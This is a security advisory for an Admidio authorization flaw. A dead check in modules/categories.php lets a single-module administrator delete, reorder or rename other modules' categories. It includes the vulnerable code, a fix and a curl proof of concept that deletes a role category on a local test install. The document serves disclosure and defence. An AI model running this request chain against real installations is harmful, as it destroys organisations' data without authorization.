# [M] Admidio module-administrator can delete or reorder categories owned by other modules via dead authorization check in `modules/categories.php`

## Summary
Severity: Medium
Advisory: GHSA-rwjr-qjj3-mq2f
CVE: CVE-2026-47227
CWE: CWE-639, CWE-863
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-rwjr-qjj3-mq2f
Type: github-advisory

## Affected
- Packagist: `admidio/admidio` — affected >=0 <5.0.10

## Details
## Summary

`modules/categories.php` checks that the supplied `type` parameter (`ANN`, `EVT`, `ROL`, `USF`, …) corresponds to a module the actor administers. The follow-up "is this specific category editable by me" check at lines 56-61 is dead code because it compares `$getType` (a category-type code) against mode names (`edit`/`save`/`delete`); the condition is permanently false, so `$category->isEditable()` is never invoked. The `delete`, `sequence`, and `save` switch cases load the category by the supplied UUID and act on it without re-checking that the category belongs to a module the actor administers. A user holding only one module-administrator right can therefore destroy or reorder empty categories belonging to *other* modules — for example, an announcements administrator can delete role categories, profile-field categories, or weblink categories that they have no right to touch.

## Details

### vulnerable code

`modules/categories.php:40-61`:

```php
$getMode         = admFuncVariableIsValid($_GET, 'mode', 'string',
                                          array('defaultValue' => 'list',
                                                'validValues'  => array('list', 'edit', 'save', 'delete', 'sequence')));
$getType         = admFuncVariableIsValid($_GET, 'type', 'string',
                                          array('validValues' => array('ANN','AWA','EVT','FOT','LNK','ROL','USF','IVT')));
$getCategoryUUID = admFuncVariableIsValid($_GET, 'uuid', 'uuid');

// check rights of the type
if (($getType === 'ANN' && !$gCurrentUser->isAdministratorAnnouncements())
    || ($getType === 'AWA' && !$gCurrentUser->isAdministratorUsers())
    || ($getType === 'EVT' && !$gCurrentUser->isAdministratorEvents())
    || ($getType === 'FOT' && !$gCurrentUser->isAdministratorForum())
    || ($getType === 'LNK' && !$gCurrentUser->isAdministratorWeblinks())
    || ($getType === 'ROL' && !$gCurrentUser->isAdministratorRoles())
    || ($getType === 'USF' && !$gCurrentUser->isAdministratorUsers())
    || ($getType === 'IVT' && !$gCurrentUser->isAdministratorInventory())) {
    throw new Exception('SYS_NO_RIGHTS');
}

if (in_array($getType, array('edit', 'save', 'delete'))) {           // <- DEAD CODE
    // check if this category is editable by the current user and current organization
    if (!$category->isEditable()) {
        throw new Exception('SYS_NO_RIGHTS');
    }
}
```

The `in_array($getType, array('edit','save','delete'))` test compares the category-type code to mode names. `$getType` can only be `ANN`, `AWA`, `EVT`, `FOT`, `LNK`, `ROL`, `USF`, or `IVT` (it is rejected by `admFuncVariableIsValid` if it is anything else), so the array intersection is permanently empty. The intended check was probably `in_array($getMode, array('edit','save','delete'))`. As written, `$category->isEditable()` is never called from this entry point, and the `$category` symbol is not defined here at all (it is local to other code paths), so even if the operator were corrected the body of the if would throw an undefined-variable warning before doing anything useful.

`modules/categories.php:99-110` — the `delete` switch case just loads the category by UUID and deletes it, with no per-record permission check:

```php
case 'delete':
    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);

    $menu = new Category($gDb);
    $menu->readDataByUuid($getCategoryUUID);
    $menu->delete();
    echo json_encode(array('status' => 'success'));
    break;
```

`modules/categories.php:112-123` — the `sequence` switch case has the same shape.

`Category::delete()` blocks deletion of the system / default category and of categories that still have referenced records (events, announcements, role assignments, etc.), but does *not* check whether the category's `cat_type` matches a module the actor has rights over.

### exploitation flow

1. Attacker has `Announcements administrator` (or any other single module-admin right) but is **not** a roles / inventory / weblinks administrator.
2. Attacker observes the UUID of a target category by listing categories of any type they DO have rights over (the listing returns category UUIDs of their own type), or simply enumerates by visiting `modules/categories.php?type=<their_type>&mode=list`.
3. Attacker requests `POST /modules/categories.php?mode=delete&type=ANN&uuid=<UUID-of-foreign-category>` carrying their valid `adm_csrf_token`. `type=ANN` satisfies the rights gate at line 47-58 (they are an announcements admin). The dead `if` at line 56 does not fire. The switch falls into `case 'delete':` which deletes the category without re-checking the type.
4. Server replies `{"status":"success"}`. The cross-module category is gone.

The same primitive applies to `mode=sequence` (reorder), and to `mode=save` for editing the category's name and description.

## PoC

Tested on a fresh install of HEAD `c5cde53` running on PHP 8.4 + MariaDB 11.8 at `http://127.0.0.1:8085`. Reproduces in two requests. `testadmin` is the bootstrap administrator created during install; `annadmin` is a freshly-created user whose only role is `Association's board` with `rol_announcements=1` (no roles / inventory / weblinks rights).

```
# 0. set-up: confirm starting state of the cross-module category
$ mariadb -h 127.0.0.1 -P 3399 -u admidio -p... admidio \
    -e "SELECT cat_id, cat_uuid, cat_type, cat_name FROM adm_categories WHERE cat_type='ROL' AND cat_name='TEAMS';"
cat_id  cat_uuid                              cat_type  cat_name
7       846536b9-2582-4845-a5ff-dee06f3212c7  ROL       TEAMS

# 1. login as annadmin (announcements admin only) and capture session + csrf
$ curl -s -c $C -b $C "http://127.0.0.1:8085/index.php?module=auth" > /dev/null
$ html=$(curl -s -c $C -b $C "http://127.0.0.1:8085/system/login.php?...")
$ csrf=$(grep -oE 'adm_csrf_token[^"]+value="[^"]+' /tmp/login.html | head -1 | ...)
$ curl -s -c $C -b $C \
    --data-urlencode "adm_csrf_token=$csrf" \
    --data-urlencode "adm_login_name=annadmin" \
    --data-urlencode "adm_password=Annpwd123!" \
    "http://127.0.0.1:8085/system/login.php?mode=check"
{"status":"success","url":"..."}

# 2. as annadmin, GET the categories page once to seed an in-session form key
$ html=$(curl -s -b $C "http://127.0.0.1:8085/modules/categories.php?type=ANN&mode=list")
$ csrf=$(echo "$html" | grep -oE 'adm_csrf_token[^"]+value="[^"]+' | head -1 | sed 's/.*value="//')

# 3. fire the cross-type delete: type=ANN (annadmin has rights), uuid=<ROL category>
$ curl -s -b $C \
    -X POST \
    --data-urlencode "adm_csrf_token=$csrf" \
    --data-urlencode "direction=" \
    "http://127.0.0.1:8085/modules/categories.php?mode=delete&type=ANN&uuid=846536b9-2582-4845-a5ff-dee06f3212c7"
{"status":"success"}

# 4. verify the row is gone — annadmin had no role-administrator rights
$ mariadb ... admidio -e "SELECT * FROM adm_categories WHERE cat_uuid='846536b9-2582-4845-a5ff-dee06f3212c7';"
(no rows)
```

The same chain with `mode=sequence&direction=UP` reorders a foreign category. With `mode=save`, an attacker can rename the foreign category and (via the unprotected `cat_type` rebind in `CategoryService::save()` line 210) re-tag it to a different module type, breaking referential consistency.

## Impact

Any user with at least one module-administrator right can delete or reorder admin-managed categories of other modules:

- Role categories (the structural grouping of all roles in the organisation)
- Event calendars (each calendar is a category of type `EVT`)
- Profile-field categories (the grouping of which fields are shown on which profile tab)
- Weblink categories
- Forum categories (`FOT`)
- Inventory categories (`IVT`)

`Category::delete()` blocks categories with active rows, so the attack lands on currently-empty categories, but a malicious announcement-admin can also delete the *default* category for a module immediately after the legitimate admin deletes its last record, eliminating the implicit "Default Category" before a new record can re-create it. The target organisation loses the structural grouping for an entire module and must rebuild it by hand from a fresh database state.

The CVSS reflects: any user with a single module-admin role can permanently destroy structural metadata for every other module. `PR:L` because module-admin rights are routinely granted to non-administrative users (chairs of subgroups, content editors). `I:H` because data is destroyed and there is no in-product undo. `A:N` because the system stays up; only the affected module's metadata is gone.

## Recommended Fix

Replace the dead `if (in_array($getType, array('edit', 'save', 'delete')))` block with a real check on `$getMode` plus a per-record `isEditable()` test that re-derives the module from `cat_type`:

```php
if (in_array($getMode, array('edit', 'save', 'delete', 'sequence'), true) && $getCategoryUUID !== '') {
    $category = new Category($gDb);
    $category->readDataByUuid($getCategoryUUID);

    if ($category->isNewRecord()) {
        throw new Exception('SYS_INVALID_PAGE_VIEW');
    }

    // re-check rights against the *record's* cat_type, not the user-supplied type
    $recordType = $category->getValue('cat_type');
    if (   ($recordType === 'ANN' && !$gCurrentUser->isAdministratorAnnouncements())
        || ($recordType === 'AWA' && !$gCurrentUser->isAdministratorUsers())
        || ($recordType === 'EVT' && !$gCurrentUser->isAdministratorEvents())
        || ($recordType === 'FOT' && !$gCurrentUser->isAdministratorForum())
        || ($recordType === 'LNK' && !$gCurrentUser->isAdministratorWeblinks())
        || ($recordType === 'ROL' && !$gCurrentUser->isAdministratorRoles())
        || ($recordType === 'USF' && !$gCurrentUser->isAdministratorUsers())
        || ($recordType === 'IVT' && !$gCurrentUser->isAdministratorInventory())) {
        throw new Exception('SYS_NO_RIGHTS');
    }

    if (!$category->isEditable()) {
        throw new Exception('SYS_NO_RIGHTS');
    }
}
```

Additionally, `CategoryService::save()` should refuse to mutate `cat_type` when editing an existing record (drop the `$this->categoryRessource->setValue('cat_type', $this->type)` at line 210, or set it only when `isNewRecord()`).

A regression test should call `categories.php?mode=delete&type=ANN&uuid=<ROL-category>` as a user with only `isAdministratorAnnouncements()` and assert the response is `SYS_NO_RIGHTS` rather than `success`.

## References
- https://github.com/Admidio/admidio/security/advisories/GHSA-rwjr-qjj3-mq2f
- https://github.com/Admidio/admidio
